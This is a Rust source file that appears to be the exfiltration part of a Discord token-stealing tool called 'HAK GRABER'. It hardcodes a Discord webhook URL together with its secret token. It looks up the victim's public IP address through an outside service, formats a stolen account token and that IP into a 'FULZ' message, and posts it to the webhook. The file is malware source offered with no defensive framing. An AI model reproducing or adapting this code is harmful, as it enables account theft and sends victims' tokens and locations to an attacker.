use ureq;

const DISCORD_WEBHOOK_URL: &'static str = "https://discordapp.com/api/webhooks/726175225397510234/3o-NynTRD7FDaMfg_o_JilD6EHkDXS4_xdKfYJGePoBDGeHv_ylMD2rb-3EWDloZpb6G";

pub fn send_webhook_message(message: &str) {
    let _result = ureq::post(DISCORD_WEBHOOK_URL)
        .send_form(&[("username", "HAK GRABER"), ("content", message)]);
}

pub fn format_token(token: &str, ip_address: &str) -> String {
    format!("HAK GRABER FULZ\nToken: {}\nIP: {}", token, ip_address)
}

pub fn get_ip_address() -> String {
    const API_ENDPOINT: &'static str = "https://wtfismyip.com/text";
    let result = ureq::get(API_ENDPOINT).call();
    result.into_string().unwrap()
}
